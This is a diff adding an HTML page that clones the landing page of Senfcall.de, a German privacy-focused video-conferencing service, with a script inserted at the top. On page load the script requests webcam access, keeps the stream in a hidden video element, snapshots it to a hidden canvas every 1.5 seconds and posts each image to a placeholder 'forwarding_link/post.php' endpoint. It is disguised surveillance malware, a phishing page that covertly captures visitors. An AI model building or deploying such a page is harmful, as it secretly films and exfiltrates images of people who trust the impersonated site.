@@ -1,0 +1,302 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        
+
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Senfcall – Gib deinen Senf dazu!</title>
+	<link rel="stylesheet" href="https:&#x2F;&#x2F;www.senfcall.de&#x2F;bulma.min.css">
+	<link rel="stylesheet" href="https:&#x2F;&#x2F;www.senfcall.de&#x2F;style.css">
+	<link rel="icon" type="image/png" href="https:&#x2F;&#x2F;www.senfcall.de&#x2F;favicon.png" sizes="32x32">
+</head>
+
+<body>
+	<!-- HEADER -->
+	<!--<section class="hero is-primary is-warning">
+			<div class="hero-body">
+				<div class="container">
+					<h1 class="title">
+						senfcall
+					</h1>
+					<h2 class="subtitle">
+						Gib deinen Senf dazu!
+					</h2>
+				</div>
+			</div>
+		</section>-->
+
+	<section class="hero is-medium has-background large-title">
+	    <img class="hero-background" src="https:&#x2F;&#x2F;www.senfcall.de&#x2F;meeting.jpg">
+	    <div class="hero-body">
+	        <div class="container">
+	            <h1 class="title has-text-white on-left">
+	                Senfcall.de
+	            </h1>
+	            <h2 class="subtitle has-text-light">
+					Privatsphäre respektierende Videokonferenzen
+	            </h2>
+	        </div>
+	    </div>
+	</section>
+
+
+	<!-- NAVBAR -->
+	<nav class="navbar  is-warning" role="navigation"
+		aria-label="main navigation">
+		<div class="container">
+			<div class="navbar-brand">
+				<a class="navbar-item" href="./">
+					<img src="https:&#x2F;&#x2F;www.senfcall.de&#x2F;senfcall.svg" alt="senfcall">
+				</a>
+				<div class="mobile-meeting-button-wrapper">
+					<a class="button is-light" href="https://public.senfcall.de/" style="">
+						Meeting starten
+					</a>
+				</div>
+				<a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false">
+					<span aria-hidden="true"></span>
+					<span aria-hidden="true"></span>
+					<span aria-hidden="true"></span>
+				</a>
+			</div>
+			<div class="navbar-menu">
+				<div class="navbar-start">
+					<a class="navbar-item" href="./news">
+						News
+					</a>
+					<a class="navbar-item" href="./help">
+						Hilfe
+					</a>
+					<a class="navbar-item" href="./donate">
+						Spenden
+					</a>
+					<a class="navbar-item language-button" href="javascript:window.location.pathname='/en'+window.location.pathname">
+						<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABZ0RVh0Q3JlYXRpb24gVGltZQAwOS8wNi8xMy48nZQAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzVxteM2AAACd0lEQVQ4jY2VP0/bQBjGHyKPIVgCM0QCn8Sc1JIlRnQLI8L4E3gjUoay9htEAgkmOjp7BiK+QD22k0+3VEw2HVu1cVO1SF2eDrEtY2KXR3qH851/73N/X5AESQAIAHhF+38BwARwYVnWFwAsv1cGRAAIIAVwA8BpgARCiE9CiO9XV1dPSZLQdd1FG7AaCsAFgHf9fv9+f3//22g0WsZxzKqqQAMt6vV6bzqdzvVyucTx8TGklPA8D6ZpNv9Ud9jr9WhZFk9OTnh3d0eS3NzcfOb89PSUYRhysVi8cAgAotvtvu92u3+llAzDkHXVgXW4bdu/AQiSwPb29rKabZ3agC/WPLdbSmvNyWTSCjRNk1EU0fO8l9Aq0Pd9GoZB27ZbgUEQkCTTNG0HFg4HgwEBcDabrQUqpcrxQoj1wKOjIxqGweFwyPF4zN3d3bUOHcchSUZRRJIMgmA9UGtNrTVJ0rbt0l0dOJ1OSZJSSqZpyul02j7l2WxG3/cbgVmWkSSVUkzTlFmWtQN936fWmkIIWpZFrXUJLDZDKVWCSdJxnBLYqd6a4XCIw8NDDAYDJEmC29tbPDw8lP1CCACAlBKmaeLs7KxslyocTiaTcg3rOjg4eGo6zEopzufz5imvk+u6iyaglPL5xrQB4zjm+fn5z62trR8AklddvzqwgOzt7X3t9/v3qLziABwA161w13UXSZLw8vLyz87Ozi/btj9iVQ5MtpcAB8BbAHENCr4WkoNusHo7i3AAiAp89Y5VskYAZAvQBPC5cFTvN0imlaOY5vFhY2PjEcA8T5DlLhwAXg5Vefu5GlwIrIpTlCcoCta8ujQAwvq//wD7F5sgS+yPtgAAAABJRU5ErkJggg==" alt="choose-language" />
+						 &nbsp;English
+					</a>
+					<a href="https://lecture.senfcall.de/signin" class="navbar-item login-button">
+						<img alt="lock" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAlCAYAAAAjt+tHAAABhWlDQ1BJQ0MgcHJvZmlsZQAAKJF9kTtIw1AUhv+mFUUqHewgIpKhOlkQXzhKFYtgobQVWnUwuekLmjQkKS6OgmvBwcdi1cHFWVcHV0EQfIC4uTkpukiJ5yaFFjEeuNyP/57/595zAaFRYaoZGAdUzTJS8ZiYza2K3a/wYRghTCMgMVNPpBcz8Kyve+qmuovyLO++P6tPyZsM8InEc0w3LOIN4plNS+e8TxxmJUkhPiceM+iCxI9cl11+41x0WOCZYSOTmicOE4vFDpY7mJUMlXiKOKKoGuULWZcVzluc1UqNte7JXxjMaytprtMaQhxLSCAJETJqKKMCC1HaNVJMpOg85uEfdPxJcsnkKoORYwFVqJAcP/gf/J6tWZiccJOCMaDrxbY/RoDuXaBZt+3vY9tungD+Z+BKa/urDWD2k/R6W4scAaFt4OK6rcl7wOUOMPCkS4bkSH5aQqEAvJ/RN+WA/lugd82dW+scpw9Ahma1fAMcHAKjRcpe93h3T+fc/u1pze8HjmRysvYu/d4AAAAGYktHRAAzADMAM4Y/Q/YAAAAJcEhZcwAADdcAAA3XAUIom3gAAAAHdElNRQflAR4QBx03mnDjAAABtElEQVRYw+3YP2gUURDH8c9tIop/EAsLN6CVhTaKjxRiIQQ0iKWVvWBpY2NjkSYptA3YC8bCMoXYRkRwUCxsjIgBvSKgiBI0grF5xXHeXvZykG32B9vMzJv5vvfm7b+OEZRSOozruIqzKLPrC95gGY8i4nvdnJ2ahffgNu7g0DbhPzCPexHxZ2yAlNIxPMF5o+kFrkVEd8cAKaWjeI6Tdqb3uBAR61UBxZDiHSyNUVweu5RzjQaAG5gZ4t/E63xtDombybnqb0FKqcAapga4N3AXDyLiZ44/iJuYw/4BYz7jeET87XdMVoBdqSj+C7MRsdJrzCD3U0ov8Qz7+sZN5ZzLdbfgcoV9ob94H8gKFircl0bpgXMDbFtYrNF4izn2v50dBeDAANunYcepZxXWc//UyTn0FPTr2wixX+sGFhpWC9A4QCffyVJ+1J7I9tMD7mgbeFcz73bj1zAfEa86KaWLeIq9uzz535idKMvycc/Md1OTOFVgusEWmC4absSiPYYtQAvQArQALUBR8Q6/W9oqsNogwGqRPyib0txEt9t9W5blB5zBkbq/bcZZdnzErYh4+A/WM29QukWQDwAAAABJRU5ErkJggg==">
+						Einloggen
+					</a>
+				</div>
+				<div class="navbar-end">
+
+					<div class="navbar-item">
+						<a class="button is-light" href="https://public.senfcall.de/">
+							Meeting starten
+						</a>
+
+					</div>
+				</div>
+			</div>
+		</div>
+	</nav>
+
+
+	<!-- CONTENT -->
+	<section class="main">
+		<div class="container content">
+			
+<div class="section">
+    <div class="columns is-mobile is-centered is-multiline">
+        
+			
+        <div class="column feature is-half-mobile">
+            <img src=https://www.senfcall.de/shield.svg alt="Icon Datensparsam">
+            <div class="feature-desc">
+                <h3>Datensparsam</h3>
+                <p>Wir erheben nur die Daten, die auch für den Service nötig sind. Alle Daten werden auf einem <strong>Server in Deutschland</strong> verarbeitet.</p>
+
+            </div>
+        </div>
+        
+        
+			
+        <div class="column feature is-half-mobile">
+            <img src=https://www.senfcall.de/compass.svg alt="Icon Ohne Installation">
+            <div class="feature-desc">
+                <h3>Ohne Installation</h3>
+                <p>Du kannst Senfcall <strong>einfach per Webbrowser</strong> auf all deinen Geräten nutzen, ganz ohne Installation! Keine zusätzliche Software, die neue Sicherheitslücken schafft.</p>
+
+            </div>
+        </div>
+        
+        
+			
+        <div class="column feature is-half-mobile">
+            <img src="https://www.senfcall.de/check-square.svg" alt="Icon DSGVO konform">
+            <div class="feature-desc">
+                <h3>DSGVO konform</h3>
+                <p>Senfcall atmet den Geist der DSGVO. Wir winden uns nicht um die Regeln, sondern behandeln den <strong>Datenschutz als first-class citizen</strong>.</p>
+
+            </div>
+        </div>
+        
+        
+			
+        <div class="column feature is-half-mobile">
+            <img src=https://www.senfcall.de/code.svg alt="Icon Open-Source">
+            <div class="feature-desc">
+                <h3>Open-Source</h3>
+                <p>Für Senfcall nutzen wir das <strong>Open Source</strong> Web Conference Tool <a href="https://github.com/bigbluebutton/bigbluebutton">BigBlueButton™</a>. Daneben veröffentlichen wir <a href="/opensource">einige unserer eigenen Tools</a> unter freien Lizenzen.</p>
+
+            </div>
+        </div>
+        
+        
+			
+        
+			
+        
+			
+        
+			
+        
+    </div>
+</div>
+
+
+<div class="section">
+    <h1 id="gib-deinen-senf-dazu">Gib deinen Senf dazu!</h1>
+<p>Viele behaupten: &quot;Zuverlässige Videokonferenzen? Das können nur große Unternehmen im Silicon Valley.&quot; Doch diese Unternehmen stehen immer wieder in der Kritik unsere Privatsphäre und die Sicherheit unserer Computer zu gefährden.</p>
+<p>Als Studierende in Darmstadt und Karlsruhe wurden wir von unseren Universitäten gezwungen, die Anwendungen solcher Unternehmen zu nutzen. Deshalb wollen wir zeigen, dass Videokommunikation für den digitalen Familienbesuch, Web-Seminare, Unterricht und Konferenzen auch mit Datenschutz funktioniert. Mit Senfcall bieten wir Videokonferenzen über die Open Source Software <a href="https://bigbluebutton.org/">BigBlueButton™</a> an. Der Vorteil: um Senfcall zu nutzen brauchst du nur deinen Webbrowser - Keine zusätzliche Software, die neue Sicherheitslücken schafft.</p>
+<p>Damit auch du privatsphäre-schützende Videokonferenzen nutzen kannst.</p>
+<p>Senfcall verwendet BigBlueButton und wird nicht von BigBlueButton Inc. unterstützt oder zertifiziert. BigBlueButton und das BigBlueButton-Logo sind Warenzeichen von BigBlueButton Inc..</p>
+
+</div>
+
+<div class="section has-text-centered">
+    <a class="button is-warning is-large" href="https://public.senfcall.de/">Jetzt Meeting starten!</a>
+</div>
+
+
+		</div>
+	</section>
+
+	<!-- FOOTER -->
+	<footer class="footer">
+		<div class="content has-text-centered">
+			<p>
+				<a href="./imprint">Impressum</a> |
+				<a href="./gdpr">Datenschutz</a> |
+				<a href="./opensource">Open Source</a>
+			</p>
+			<p>
+				<a rel="me" href="https://chaos.social/@senfcall">
+					Folge uns auf Mastodon<br>
+					<svg aria-hidden="true" focusable="false" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon is-medium"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z" class=""></path></svg></a>
+			</p>
+
+		</div>
+	</footer>
+
+	<script>
+		/* animation looks weird
+		document.addEventListener('scroll', function() {
+			if (window.pageYOffset <= 10)
+				document.querySelector(".navbar").classList.add("is-spaced");
+			else
+				document.querySelector(".navbar").classList.remove("is-spaced");
+		});
+		*/
+		document.querySelector(".navbar-burger").addEventListener("click", function () {
+			document.querySelector(".navbar-burger").classList.toggle("is-active");
+			document.querySelector(".navbar-menu").classList.toggle("is-active");
+		});
+
+		if (window.location.pathname.length > 1 && window.location.pathname.endsWith("/") && window.location.pathname != "/en/" && window.location.hostname.includes("senfcall.de")) {
+			window.location.pathname = window.location.pathname.replace(/\/$/, "")
+		}
+	</script>
+	
+<script>
+    document.addEventListener('scroll', function() {
+        if (window.pageYOffset <= 10)
+            document.querySelector(".navbar").classList.add("navbar-is-transparent");
+        else 
+            document.querySelector(".navbar").classList.remove("navbar-is-transparent");
+    });
+</script>
+
+
+</body>
+
+</html>
